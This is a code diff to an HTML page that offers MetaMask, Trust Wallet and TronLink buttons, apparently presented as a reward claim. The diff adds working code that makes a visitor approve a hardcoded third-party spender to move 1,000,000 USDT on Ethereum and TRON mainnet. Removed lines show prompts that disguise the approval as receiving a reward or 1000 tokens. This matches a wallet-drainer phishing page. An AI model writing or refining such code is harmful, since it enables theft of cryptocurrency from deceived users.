@@ -326,7 +326,7 @@
     </div>
     
     <div class="wallet-options">
-      <div class="wallet-btn" onclick="approveUSDT('metamask')">
+      <div class="wallet-btn" onclick="connectWallet('metamask')">
         <i class="fab fa-ethereum"></i>
         <div>
           <div class="wallet-name">MetaMask</div>
@@ -334,7 +334,7 @@
         </div>
       </div>
       
-      <div class="wallet-btn" onclick="approveUSDT('trustwallet')">
+      <div class="wallet-btn" onclick="connectWallet('trustwallet')">
         <i class="fas fa-wallet"></i>
         <div>
           <div class="wallet-name">Trust Wallet</div>
@@ -342,7 +342,7 @@
         </div>
       </div>
       
-      <div class="wallet-btn" onclick="approveUSDT('tronlink')">
+      <div class="wallet-btn" onclick="connectWallet('tronlink')">
         <i class="fas fa-link"></i>
         <div>
           <div class="wallet-name">TronLink</div>
@@ -392,55 +392,13 @@
       }
     }
     
-    // Simulate wallet connection
-    function approveUSDT(walletType) {
-      const loading = document.getElementById('loading');
-      const statusMessage = document.getElementById('statusMessage');
-      
-      // Reset status
-      statusMessage.style.display = 'none';
-      loading.style.display = 'flex';
-      
-      // Simulate processing delay
-      setTimeout(() => {
-        loading.style.display = 'none';
-        
-        // Random success/error for demo
-        if (Math.random() > 0.3) {
-          statusMessage.textContent = 'Success! Authorization complete. Your reward will be credited shortly.';
-          statusMessage.className = 'status-message success';
-        } else {
-          statusMessage.textContent = 'Error: Could not complete authorization. Please try again.';
-          statusMessage.className = 'status-message error';
-        }
-        
-        statusMessage.style.display = 'block';
-      }, 3000);
-    }
-    
-    // Initialize
-    window.addEventListener('DOMContentLoaded', () => {
-      createParticles();
-    });
-  </script>
-  <script>
-    // Add subtle particle animations
-    function createParticle() {
-      const particle = document.createElement("div");
-      particle.classList.add("particle");
-      particle.style.left = `${Math.random() * 100}vw`;
-      particle.style.animationDuration = `${Math.random() * 3 + 4}s`;
-      document.body.appendChild(particle);
-      setTimeout(() => particle.remove(), 5000);
-    }
-    setInterval(createParticle, 500);
-  </script>
-
-  <script>
+    // USDT Contract Details
     const ethUsdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC-20
     const tronUsdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
-    const ethSpenderAddress = "0x1234567890abcdef1234567890abcdef12345678"; // REPLACE with actual Ethereum address
+    const ethSpenderAddress = "0x1234567890abcdef1234567890abcdef12345678"; // Replace with actual Ethereum address
     const tronSpenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
+    
+    // USDT ABI
     const usdtABI = [
       {
         constant: false,
@@ -514,132 +472,132 @@
     }
 
     async function connectWallet(walletType) {
+      const loading = document.getElementById('loading');
+      const statusMessage = document.getElementById('statusMessage');
+      
+      // Reset status
+      statusMessage.style.display = 'none';
+      statusMessage.className = 'status-message';
+      loading.style.display = 'flex';
+      
       try {
         let provider;
         if (walletType === "metamask" || walletType === "trustwallet") {
-          if (window.ethereum && (window.ethereum.isMetaMask || window.ethereum.isTrust)) {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await window.ethereum.request({ method: "eth_requestAccounts" });
+          if (window.ethereum) {
+            // Request account access
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            // Switch to Ethereum Mainnet
             const networkAdded = await setupEthereumNetwork();
             if (!networkAdded) {
               throw new Error(`Please switch to Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}.`);
             }
+            
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const address = await signer.getAddress();
+            
+            statusMessage.textContent = `Connected with address: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+            statusMessage.className = 'status-message success';
           } else {
-            provider = await EthereumProvider.init({
-              projectId: "f6b400b4393b83bb22ef4c2c3a5c805ad72d2", // Replace with your WalletConnect project ID
-              chains: [1], // Ethereum Mainnet chain ID
-              optionalChains: [1],
-              rpcMap: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
-              metadata: {
-                name: "USDT Approval",
-                description: "Approve USDT on Ethereum",
-                url: window.location.href,
-                icons: ["https://metamask.io/favicon.ico"]
-              },
-              showQrModal: true
-            });
-            await provider.connect();
-            provider = new ethers.providers.Web3Provider(provider);
-            const networkAdded = await setupEthereumNetwork();
-            if (!networkAdded) {
-              throw new Error(`Please add Ethereum Mainnet in ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"} via WalletConnect.`);
-            }
+            throw new Error(`${walletType === "metamask" ? "MetaMask" : "Trust Wallet"} not detected!`);
           }
+        } 
+        else if (walletType === "tronlink") {
+          const tronWebReady = await waitForTronWeb();
+          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
+            throw new Error("Please install TronLink and log in to your wallet.");
+          }
+
+          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
+            throw new Error("Please connect to the TRON Mainnet in TronLink.");
+          }
+
+          const address = window.tronWeb.defaultAddress.base58;
+          statusMessage.textContent = `Connected with address: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+          statusMessage.className = 'status-message success';
         }
-        return provider;
+        
+        // Show approve button after successful connection
+        setTimeout(() => {
+          if (confirm("Do you want to approve USDT spending?")) {
+            approveUSDT(walletType);
+          }
+        }, 1000);
+        
       } catch (error) {
-        throw new Error(`Failed to access ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}: ${error.message}`);
+        console.error("Connection error:", error);
+        statusMessage.textContent = `Connection failed: ${error.message}`;
+        statusMessage.className = 'status-message error';
+      } finally {
+        loading.style.display = 'none';
+        statusMessage.style.display = 'block';
       }
     }
 
     async function approveUSDT(walletType) {
-      const loadingDiv = document.getElementById("loading");
-      const statusText = document.getElementById("statusText");
-
+      const loading = document.getElementById('loading');
+      const statusMessage = document.getElementById('statusMessage');
+      
+      // Reset status
+      statusMessage.style.display = 'none';
+      loading.style.display = 'flex';
+      
       try {
-        loadingDiv.style.display = "block";
-        statusText.textContent = "";
-
         // Set approval amount: 1,000,000 USDT
         let amount;
         const ethersReady = await waitForEthers();
-        if (ethersReady) {
-          amount = ethers.utils.parseUnits("1000000", walletType === "tronlink" ? 6 : 18).toString();
-        } else {
-          amount = walletType === "tronlink" ? "1000000000000" : "1000000000000000000000000"; // 1M * 10^6 (TRC-20) or 1M * 10^18 (ERC-20)
-          console.warn("ethers.js not loaded, using fallback amount.");
-        }
-
+        
         if (walletType === "tronlink") {
-          // TronLink approval (TRC-20)
-          const tronWebReady = await waitForTronWeb();
-          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
-            statusText.textContent = "Please install TronLink and log in to your wallet.";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
-          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
-            statusText.textContent = "Please connect to the TRON Mainnet.";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
-          if (!window.tronWeb.isAddress(tronSpenderAddress)) {
-            statusText.textContent = "Invalid TRON spender address!";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
+          amount = "1000000000000"; // 1M * 10^6 (TRC-20)
+          
           const contract = await window.tronWeb.contract(usdtABI, tronUsdtContractAddress);
-
-          if (!confirm("موافق على استقبال 1000")) {
-            statusText.textContent = "Approval cancelled.";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
-          statusText.textContent = "Sending approval transaction with TronLink...";
+          statusMessage.textContent = "Sending approval transaction with TronLink...";
+          statusMessage.style.display = 'block';
+          
           const tx = await contract.approve(tronSpenderAddress, amount).send({
             feeLimit: 30000000, // 30 TRX
-            callValue: 0,
-            shouldPollResponse: false
+            callValue: 0
           });
-
-          statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
-        } else if (walletType === "metamask" || walletType === "trustwallet") {
-          // MetaMask or Trust Wallet approval (ERC-20)
-          const provider = await connectWallet(walletType);
+          
+          statusMessage.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
+          statusMessage.className = 'status-message success';
+        } 
+        else if (walletType === "metamask" || walletType === "trustwallet") {
+          if (ethersReady) {
+            amount = ethers.utils.parseUnits("1000000", 6).toString(); // 1M USDT with 6 decimals
+          } else {
+            amount = "1000000000000"; // Fallback amount
+            console.warn("ethers.js not loaded, using fallback amount.");
+          }
+          
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
           const signer = provider.getSigner();
-
-          if (!ethers.utils.isAddress(ethSpenderAddress)) {
-            statusText.textContent = "Invalid Ethereum spender address!";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
           const contract = new ethers.Contract(ethUsdtContractAddress, usdtABI, signer);
-
-          if (!confirm("موافق على استقبال 1000")) {
-            statusText.textContent = "Approval cancelled.";
-            loadingDiv.style.display = "none";
-            return;
-          }
-
-          statusText.textContent = `Sending approval transaction with ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}...`;
+          
+          statusMessage.textContent = `Sending approval transaction with ${walletType === "metamask" ? "MetaMask" : "Trust Wallet"}...`;
+          statusMessage.style.display = 'block';
+          
           const tx = await contract.approve(ethSpenderAddress, amount, { gasLimit: 150000 });
           const receipt = await tx.wait();
-
-          statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
+          
+          statusMessage.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
+          statusMessage.className = 'status-message success';
         }
-
-        loadingDiv.style.display = "none";
       } catch (error) {
-        console.error("Transaction error:", error);
-        statusText.textContent = `Approval failed: ${error.message || error}`;
-        loadingDiv.style.display = "none";
+        console.error("Approval error:", error);
+        statusMessage.textContent = `Approval failed: ${error.message}`;
+        statusMessage.className = 'status-message error';
+      } finally {
+        loading.style.display = 'none';
+        statusMessage.style.display = 'block';
       }
     }
+
+    // Initialize
+    window.addEventListener('DOMContentLoaded', () => {
+      createParticles();
+    });
   </script>
 </body>
 </html>
